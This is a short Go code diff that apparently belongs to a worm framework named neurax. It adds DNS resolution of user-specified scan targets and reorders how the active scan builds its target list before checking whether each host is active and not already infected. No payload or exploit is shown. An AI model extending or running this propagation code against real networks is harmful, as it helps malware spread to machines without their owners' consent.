@@ -544,12 +544,34 @@ func neurax_scan_passive(f func(string)) {
 	}
 }
 
+func targets_lookup(targets []string) []string {
+	res := []string{}
+	for _, target := range targets {
+		if RegexMatch("ip", target) {
+			res = append(res, target)
+		} else {
+			ip_addresses, err := DnsLookup(target)
+			if err != nil {
+				return []string{}
+			}
+			res = append(res, ip_addresses...)
+		}
+	}
+	return res
+}
+
 func neurax_scan_active(f func(string)) {
 	targets := []string{}
 	if N.ScanGatewayFirst {
 		gateway := GetGatewayIP()
 		targets = append(targets, gateway)
 		NeuraxDebug("Added gateway to targets pool: " + gateway)
+	}
+	if len(N.ScanFirst) != 0 {
+		targets = append(targets, targets_lookup(N.ScanFirst)...)
+	}
+	if N.ScanOnly {
+		targets = targets_lookup(N.ScanFirst)
 	}
 	if N.ScanArpCache {
 		for ip, _ := range arp.Table() {
@@ -566,12 +588,6 @@ func neurax_scan_active(f func(string)) {
 		}
 	}
 	targets = RemoveFromSlice(targets, N.LocalIp)
-	if len(N.ScanFirst) != 0 {
-		targets = append(N.ScanFirst, targets...)
-	}
-	if N.ScanOnly {
-		targets = N.ScanFirst
-	}
 	for _, target := range targets {
 		NeuraxDebug("Scanning " + target)
 		if IsHostActive(target) && !IsHostInfected(target) {
